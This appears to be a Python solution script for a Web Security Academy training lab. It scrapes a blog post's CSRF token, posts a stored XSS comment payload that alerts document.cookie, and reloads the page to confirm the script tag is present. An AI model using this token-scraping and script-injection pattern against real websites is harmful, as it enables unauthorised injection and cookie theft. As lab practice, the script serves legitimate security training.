import requests
from bs4 import BeautifulSoup

site = "0aee00db0342d5658033030800b600a4.web-security-academy.net"
s = requests.Session()

# Step 1: Load blog post and extract CSRF token
blog_post_url = f'https://{site}/post?postId=1'
resp = s.get(blog_post_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

# Step 2: Post the stored XSS payload in the comment
comment_url = f'https://{site}/post/comment'
comment_string = '''<script>alert(document.cookie)</script>'''

comment_data = {
    'csrf': csrf,
    'postId': '1',
    'comment': comment_string,
    'name': 'Jarren Calizo',
    'email': 'calizo23@up.edu',
    'website': 'https://pdx.edu'
}

s.post(comment_url, data=comment_data)

# Step 3: Reload the page to confirm injection succeeded
resp = s.get(blog_post_url)
print(resp.text)  # Potentially, visually confirm the <script> tag is present in the response